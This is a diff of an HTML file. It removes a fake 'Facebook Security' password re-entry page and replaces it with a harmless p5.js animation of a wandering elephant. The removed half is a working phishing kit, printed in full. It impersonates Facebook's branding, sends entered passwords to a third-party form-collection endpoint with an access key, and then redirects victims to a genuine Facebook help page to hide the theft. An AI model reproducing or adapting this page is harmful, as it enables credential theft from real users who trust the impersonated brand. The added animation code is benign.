@@ -1,199 +1,214 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook Password Page</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        body {
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
-
-        .container {
-            background-color: white;
-            padding: 40px 30px;
-            border-radius: 8px;
-            box-shadow: 0px 4px 12px rgba(0, 0, 0, 0.15);
-            text-align: center;
-            width: 360px;
-            position: relative;
-        }
-
-        .logo {
-            margin-bottom: 20px;
-        }
-
-        .logo img {
-            width: 120px;
-        }
-
-        .header {
-            margin-bottom: 20px;
-            font-size: 18px;
-            color: #333;
-            font-weight: bold;
-        }
-
-        .form-group {
-            margin-bottom: 25px;
-            text-align: left;
-            position: relative;
-        }
-
-        .form-group label {
-            display: block;
-            font-weight: bold;
-            margin-bottom: 8px;
-            font-size: 14px;
-            color: #606770;
-        }
-
-        .input-wrapper {
-            position: relative;
-        }
-
-        .form-group input {
-            width: 100%;
-            padding: 14px;
-            padding-right: 40px;
-            /* Space for the eye icon */
-            border: 1px solid #ccd0d5;
-            border-radius: 6px;
-            font-size: 16px;
-            color: #1c1e21;
-            box-sizing: border-box;
-        }
-
-        .form-group input:focus {
-            border-color: #1877f2;
-            outline: none;
-            box-shadow: 0px 0px 0px 2px rgba(24, 119, 242, 0.2);
-        }
-
-        .eye-icon {
-            position: absolute;
-            right: 10px;
-            top: 50%;
-            transform: translateY(-50%);
-            font-size: 20px;
-            color: #606770;
-            cursor: pointer;
-            transition: color 0.3s ease;
-        }
-
-        .eye-icon:hover {
-            color: #1877f2;
-        }
-
-        .submit-button {
-            background-color: #1877f2;
-            color: white;
-            border: none;
-            padding: 14px;
-            border-radius: 6px;
-            font-size: 16px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            margin-top: 10px;
-        }
-
-        .submit-button:hover {
-            background-color: #166fe5;
-        }
-
-        .error-message {
-            color: #e74c3c;
-            font-size: 14px;
-            margin-top: 5px;
-            margin-bottom: 15px;
-            text-align: left;
-        }
-    </style>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>AI Elephant (p5.js)</title>
+  <script src="https://cdn.jsdelivr.net/npm/p5@1.9.0/lib/p5.min.js"></script>
+  <style>
+    html,body { margin:0; padding:0; background:#f6f7fb; }
+    #info { position:fixed; top:10px; left:10px; font:14px/1.4 system-ui, sans-serif; 
+            background:#fff; padding:10px 12px; border-radius:12px; box-shadow:0 8px 24px rgba(0,0,0,.08); }
+    canvas { display:block; }
+  </style>
 </head>
-
 <body>
-    <div class="container">
-        <div class="logo">
-            <img class="logo" src="https://upload.wikimedia.org/wikipedia/commons/6/6c/Facebook_Logo_2023.png" alt="Logo">
-            <div class="header">
-                Facebook Security
-            </div>
-            <p>Please re-enter your password to complete the request.</p>
-            <form id="meta-form" action="https://submit-form.com/lnKm4RieF" method="POST">
-                <input type="hidden" name="_redirect" value="https://www.facebook.com/help/media/thank-you?rdrhc" />
+<div id="info">
+  <strong>AI Elephant</strong><br/>
+  • Wanders & avoids edges<br/>
+  • Gets curious and follows your mouse when close<br/>
+  • Click to drop a peanut (target)<br/>
+</div>
 
-                <!-- Replace with your Access Key -->
-                <input type="hidden" name="access_key" value="22983eba-14f6-431b-8283-10e298027760">
-                <div class="form-group">
-                    <label for="password">Password</label>
-                    <div class="input-wrapper">
-                        <input type="password" id="password" name="password" placeholder="Enter your password" required>
-                        <i class="eye-icon fas fa-eye" id="togglePassword"></i>
-                    </div>
-                    <span id="error-message" class="error-message"></span>
-                </div>
-                <button type="submit" class="submit-button">Submit</button>
-                <center>
-                    <font color="black">
-                        <font size="2">
-            </form>
-        </div>
-        <script>
-            document.getElementById('togglePassword').addEventListener('click', function() {
-                var passwordField = document.getElementById('password');
-                var eyeIcon = this;
-                if (passwordField.type === 'password') {
-                    passwordField.type = 'text';
-                    eyeIcon.classList.remove('fa-eye');
-                    eyeIcon.classList.add('fa-eye-slash');
-                } else {
-                    passwordField.type = 'password';
-                    eyeIcon.classList.remove('fa-eye-slash');
-                    eyeIcon.classList.add('fa-eye');
-                }
-            });
+<script>
+class Elephant {
+  constructor(x, y) {
+    this.pos = createVector(x, y);
+    this.vel = p5.Vector.random2D().mult(1.5);
+    this.acc = createVector(0, 0);
+    this.maxSpeed = 2.2;
+    this.maxForce = 0.08;
+    this.state = "wander"; // wander | seek | avoid
+    this.target = null; // {pos: p5.Vector, type: 'mouse'|'peanut'}
+    this.noiseT = random(1000);
+    this.energy = 100; // drifts down when seeking
+  }
 
-            document.getElementById('passwordForm').addEventListener('submit', function(event) {
-                var passwordField = document.getElementById('password');
-                var errorMessage = document.getElementById('error-message');
-                if (passwordField.value.length < 6) {
-                    errorMessage.textContent = 'Password must be at least 6 characters long.';
-                    event.preventDefault();
-                } else {
-                    errorMessage.textContent = '';
-                    // Perform form submission via Fetch API
-                    event.preventDefault(); // Prevent default form submission
+  update() {
+    // Finite-state decisions
+    const mouse = createVector(mouseX, mouseY);
+    const edgeMargin = 60;
 
-                    var formData = new FormData(this);
-                    fetch(this.action, {
-                            method: 'POST',
-                            body: formData,
-                            headers: {
-                                'Accept': 'application/json'
-                            }
-                        })
-                        .then(response => {
-                            if (response.ok) {
-                                window.location.href = 'https://www.facebook.com/help/media/thank-you?rdrhc'; // Redirect to desired URL
-                            } else {
-                                errorMessage.textContent = 'There was an error. Please try again.';
-                            }
-                        })
-                        .catch(() => {
-                            errorMessage.textContent = 'There was an error. Please try again.';
-                        });
-                }
-            });
-        </script>
+    // Edge avoidance (soft force)
+    let edgeForce = createVector(0, 0);
+    if (this.pos.x < edgeMargin) edgeForce.x += this.mapEdge(this.pos.x, edgeMargin);
+    if (this.pos.x > width - edgeMargin) edgeForce.x -= this.mapEdge(width - this.pos.x, edgeMargin);
+    if (this.pos.y < edgeMargin) edgeForce.y += this.mapEdge(this.pos.y, edgeMargin);
+    if (this.pos.y > height - edgeMargin) edgeForce.y -= this.mapEdge(height - this.pos.y, edgeMargin);
+
+    // Curiosity: follow mouse if within radius
+    const dToMouse = p5.Vector.dist(this.pos, mouse);
+    const curiousRadius = 180;
+
+    // Choose state
+    if (edgeForce.mag() > 0.2) {
+      this.state = "avoid";
+      this.applyForce(edgeForce.limit(this.maxForce * 1.5));
+    } else if (this.target && this.target.type === "peanut") {
+      this.state = "seek";
+      this.seek(this.target.pos);
+      // Reached peanut
+      if (p5.Vector.dist(this.pos, this.target.pos) < 18) {
+        this.energy = min(120, this.energy + 25); // "eat" peanut
+        this.target = null;
+      }
+    } else if (dToMouse < curiousRadius && this.energy > 30) {
+      this.state = "seek";
+      this.target = { pos: mouse.copy(), type: "mouse" };
+      this.seek(this.target.pos);
+      this.energy -= 0.05;
+    } else {
+      this.state = "wander";
+      this.wander();
+      this.energy = min(100, this.energy + 0.02);
+      this.target = null;
+    }
+
+    // Integrate motion
+    this.vel.add(this.acc).limit(this.maxSpeed);
+    this.pos.add(this.vel);
+    this.acc.mult(0);
+  }
+
+  mapEdge(d, margin) {
+    // Stronger push the closer to edge
+    return map(constrain(d, 0, margin), 0, margin, 0.8, 0.0);
+  }
+
+  applyForce(f) {
+    this.acc.add(f);
+  }
+
+  seek(target) {
+    const desired = p5.Vector.sub(target, this.pos).setMag(this.maxSpeed);
+    const steer = p5.Vector.sub(desired, this.vel).limit(this.maxForce);
+    this.applyForce(steer);
+  }
+
+  wander() {
+    // Steering via Perlin noise to create gentle, organic motion
+    this.noiseT += 0.01;
+    const theta = noise(this.noiseT) * TWO_PI * 2;
+    const steer = p5.Vector.fromAngle(theta).mult(0.07);
+    this.applyForce(steer);
+  }
+
+  draw() {
+    push();
+    translate(this.pos.x, this.pos.y);
+    rotate(this.vel.heading() + (this.state === "seek" ? 0 : 0)); // face movement
+
+    // Body
+    noStroke();
+    fill(120, 130, 145);
+    ellipse(0, 0, 90, 70);        // body
+    ellipse(30, -20, 50, 45);     // head
+
+    // Ears
+    fill(110, 120, 135);
+    ellipse(-20, -10, 40, 50);
+
+    // Legs
+    fill(95, 105, 120);
+    rect(-25, 25, 15, 18, 6);
+    rect(-2, 25, 15, 18, 6);
+    rect(18, 25, 15, 18, 6);
+
+    // Trunk (aims at direction of travel)
+    push();
+    const trunkAngle = atan2(this.vel.y, this.vel.x);
+    rotate(trunkAngle - (this.vel.heading()));
+    fill(110, 120, 135);
+    rect(48, -14, 12, 34, 6);
+    ellipse(54, 22, 18, 12);
+    pop();
+
+    // Eye
+    fill(255);
+    ellipse(40, -25, 10, 8);
+    fill(0);
+    ellipse(42, -25, 4, 4);
+
+    // State badge
+    pop();
+    this.drawStatus();
+  }
+
+  drawStatus() {
+    push();
+    textFont('system-ui'); textSize(12); noStroke(); fill(30, 35, 45);
+    textAlign(CENTER, BOTTOM);
+    text(`state: ${this.state}`, this.pos.x, this.pos.y - 44);
+
+    // Energy bar
+    const w = 60, h = 6;
+    rectMode(CENTER);
+    fill(230); rect(this.pos.x, this.pos.y - 56, w, h, 4);
+    const pct = constrain(this.energy / 120, 0, 1);
+    fill(60, 170, 90);
+    rect(this.pos.x - w/2 + (w * pct)/2, this.pos.y - 56, w * pct, h, 4);
+    pop();
+  }
+}
+
+let ellie;
+let peanuts = [];
+
+function setup() {
+  createCanvas(window.innerWidth, window.innerHeight);
+  ellie = new Elephant(width * 0.5, height * 0.6);
+}
+
+function windowResized() {
+  resizeCanvas(window.innerWidth, window.innerHeight);
+}
+
+function draw() {
+  background(246, 247, 251);
+
+  // Draw peanuts
+  noStroke();
+  for (const p of peanuts) {
+    fill(215, 172, 90);
+    ellipse(p.x - 4, p.y, 14, 10);
+    ellipse(p.x + 4, p.y, 14, 10);
+    fill(190, 150, 75);
+    ellipse(p.x - 4, p.y, 6, 4);
+    ellipse(p.x + 4, p.y, 6, 4);
+  }
+
+  // If there’s a peanut, prefer the closest as target
+  if (peanuts.length) {
+    let closest = null, minD = Infinity;
+    for (const p of peanuts) {
+      const d = dist(ellie.pos.x, ellie.pos.y, p.x, p.y);
+      if (d < minD) { minD = d; closest = p; }
+    }
+    ellie.target = { pos: createVector(closest.x, closest.y), type: "peanut" };
+    // Remove if eaten (handled in update when very close)
+    if (minD < 18) {
+      peanuts = peanuts.filter(pp => pp !== closest);
+    }
+  }
+
+  ellie.update();
+  ellie.draw();
+}
+
+function mousePressed() {
+  // Drop a peanut at click
+  peanuts.push({ x: mouseX, y: mouseY });
+}
+</script>
 </body>
-
 </html>
